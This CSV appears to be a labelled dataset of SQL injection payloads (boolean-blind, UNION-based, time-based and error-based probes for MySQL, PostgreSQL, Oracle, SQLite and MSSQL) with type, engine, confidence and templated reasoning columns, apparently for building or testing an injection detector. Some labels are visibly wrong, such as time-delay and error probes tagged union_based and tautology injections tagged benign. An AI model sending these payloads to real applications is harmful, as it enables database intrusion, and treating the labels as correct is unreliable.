id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1026,-6144' ) or 9385 = 2474--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
1030,"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
1038,"-2715' ) ) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1043,"-2748' ) ) as gazw where 4624 = 4624 union all select 4624,4624#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
1048,1%' ) ) ) and 1661 = 7683,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
1050,"1' ) as vpop where 2528 = 2528 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
1051,"-5903%"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
1062,"1"" ) ) ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
1067,"-5661' ) ) union all select 3011,3011#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
1069,"-6292 ) union all select 7499,7499,7499,7499,7499,7499,7499--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
1071,"1"" union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
1072,1' and 4374 = 2305,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
1073,-2100' where 9260 = 9260 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
1074,"-8098%' ) union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
1077,"-4145%"" ) ) union all select 9404,9404,9404,9404,9404,9404,9404#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
1079,1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ) *6988--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,2
1080,"1%' ) ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
1082,"1%"" union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1083,"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
1084,"1'+ ( select 'gqsk' where 3087 = 3087 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
1097,"-4571' union all select 3227,3227,3227,3227--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
1100,"-5026' where 7324 = 7324 union all select 7324,7324--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1101,"1"" ) ) as sdlv where 5922 = 5922 and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
1103,-7021' or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
1106,"1"" ) ) as isqj where 6344 = 6344 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
1111,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1113,"-3595'+ ( select vppx where 6018 = 6018 union all select 6018,6018,6018,6018,6018#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
1115,-2241 ) where 7606 = 7606 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
1117,-8143 ) union all select 3014--,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
1118,"-3370"" ) union all select 7845,7845,7845,7845,7845,7845#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
1121,"-6754' ) where 8388 = 8388 union all select 8388,8388,8388,8388,8388--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
1122,"-6073"" ) ) ) or 9502 = 2012#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
1124,"-7313"" ) where 3606 = 3606 union all select 3606#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
1127,-2569' union all select 4484--,union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
1128,"1"" ) ) ) and 7153 = 7474--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
1130,"1%' union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
1132,"1%' ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1133,"-4535' ) union all select 8491,8491,8491,8491,8491,8491--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
1138,"-1684"" ) ) ) union all select 7473,7473#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
1139,"-7683"" ) where 9664 = 9664 union all select 9664,9664,9664,9664,9664,9664,9664#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
1142,-5547' or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
1144,"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2
1155,"-1641'|| ( select 'jfnu' where 7682 = 7682 union all select 7682,7682,7682--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
1159,"1 ) ) as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
1160,"1%' union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
1162,-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
1165,-2869' ) ) union all select 3216--,union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
1169,"-3885 ) where 2387 = 2387 union all select 2387,2387,2387,2387,2387,2387,2387#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
1170,"1"" ) ) as hwlh where 1071 = 1071 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
1174,1' in boolean mode ) and 5981 = 6700,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,2
1176,"-8369"" ) ) union all select 2191--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
1177,"1' ) ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
1181,"1'+ ( select vlut where 9517 = 9517 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
1185,"-5524 ) as eoyk where 6928 = 6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",union_based,generic,0.7,UNION-based payload detected. Payload length: 97 chars.,2
1188,"1 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
1189,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
1190,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
1198,-7054 ) as gzvf where 9146 = 9146 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
1199,1 ) ) ) and 6467 = 1864#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
1003,"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1011,"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1022,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""aixs"" = ""aixs",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1040,"1 ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1044,"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1045,"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1046,"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1047,"1' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1054,"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""vcjt"" like ""vcjt",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1076,"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1078,"1 ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 7484 = 7484",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1090,"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1105,"1 ) as bfuy where 3879 = 3879 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1107,"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'kpsg' like 'kpsg",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1123,"1' ) where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1136,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1137,"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1148,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1175,"1%"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1178,"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""ilrk"" = ""ilrk",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
1187,"1' in boolean mode ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1001,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1057,"-2044%' ) ) or elt ( 9299 = 3618,3618 ) and ( ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1089,"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1114,"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1125,"1 ) and elt ( 7425 = 8842,8842 ) and ( 9194 = 9194",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1145,"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1147,"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1173,"1' ) and elt ( 4249 = 4249,7259 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1186,1' ) as gsjr where 7046 = 7046 and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1012,"1%"" ) ) and make_set ( 9897 = 5557,5557 ) and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,1
1056,"-4980"" or ( 8459 = 8459 ) *4906 and ""mnlj"" like ""mnlj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1
1066,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,1
1119,"-5109 ) ) ) or make_set ( 6627 = 7331,7331 ) and ( ( ( 9466 = 9466",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,1
1126,"-5644"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""evcf"" = ""evcf",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,1
1180,1' ) and ( 1471 = 7892 ) *7892 and ( 'kkok' like 'kkok,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
1018,1 where 4844 = 4844,benign,generic,0.5,. Payload length: 19 chars.,1
1025,"1"" where 3764 = 3764",benign,generic,0.5,. Payload length: 20 chars.,1
1035,1' ) where 3572 = 3572,benign,generic,0.5,. Payload length: 22 chars.,1
1039,1' where 8128 = 8128,benign,generic,0.5,. Payload length: 20 chars.,1
1060,1' ) ) as dckd where 1794 = 1794,benign,generic,0.5,. Payload length: 32 chars.,1
1087,1' ) where 9272 = 9272,benign,generic,0.5,. Payload length: 22 chars.,1
1094,"1"" where 9230 = 9230",benign,generic,0.5,. Payload length: 20 chars.,1
1096,1' ) ) as plgq where 1121 = 1121,benign,generic,0.5,. Payload length: 32 chars.,1
1112,1' where 4460 = 4460,benign,generic,0.5,. Payload length: 20 chars.,1
1131,"1"" ) where 1793 = 1793",benign,generic,0.5,. Payload length: 22 chars.,1
1153,1' where 6116 = 6116,benign,generic,0.5,. Payload length: 20 chars.,1
1157,1' where 1623 = 1623,benign,generic,0.5,. Payload length: 20 chars.,1
1158,1 where 2060 = 2060,benign,generic,0.5,. Payload length: 19 chars.,1
1167,1' ) where 8429 = 8429,benign,generic,0.5,. Payload length: 22 chars.,1
1194,"1"" where 1166 = 1166",benign,generic,0.5,. Payload length: 20 chars.,1
1000,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'ohqs' like 'ohqs,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
1004,-4615' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
1015,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1016,-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
1017,"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; UNION-based payload detected; DB: oracle",0
1021,"1'|| ( select 'ozki' where 4435 = 4435 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
1024,-5982' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ikuh' = 'ikuh,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1027,1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1028,"1%' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and '%' = '",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
1031,-7209' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'stqx' = 'stqx,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1036,"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
1041,"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
1042,"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1052,select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master..sysdatabases ) end ) --,union_based,generic,1.0,"Signals: 'case', 'sysdatabases'; UNION-based payload detected",0
1053,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
1055,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1063,select pg_sleep ( 5 ) and ( ( ( '%' = ',union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
